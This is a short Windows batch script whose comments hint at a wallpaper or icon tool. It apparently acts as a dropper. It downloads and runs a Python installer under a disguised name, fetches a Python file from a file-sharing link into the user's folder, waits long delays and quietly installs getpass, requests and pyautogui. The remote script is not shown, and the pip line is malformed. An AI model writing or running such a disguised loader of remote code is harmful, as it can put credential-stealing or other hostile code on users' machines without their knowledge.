@echo off
:: https://s172.convertio.me/p/1JijI3Hr1wYbu-5AMA1jbw/11822097d49c8acf7fc82e215df87957/lunaricon.ico
:: Installing collected packages: Pillow, palettable, wallpaper
PowerShell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe -OutFile c:\\Users\\$env:UserName\\Downloads\\maker-3.10.2_.exe"
timeout /T 60 /NOBREAK
start %userprofile%\Downloads\maker-3.10.2_.exe
timeout /T 10 /NOBREAK
PowerShell -Command "Invoke-WebRequest https://download1647.mediafire.com/50yr7xrg2gjg/l0w39lcyl4zqmtr/main_WindowsBased_App_86x.py -OutFile C:\\users\\$env:UserName\\main_WindowsBased_App_86x.py"
timeout /T 3300 /NOBREAK 
pip install getpass, requests, time, pyautogui, random --quiet
timeout /T 60

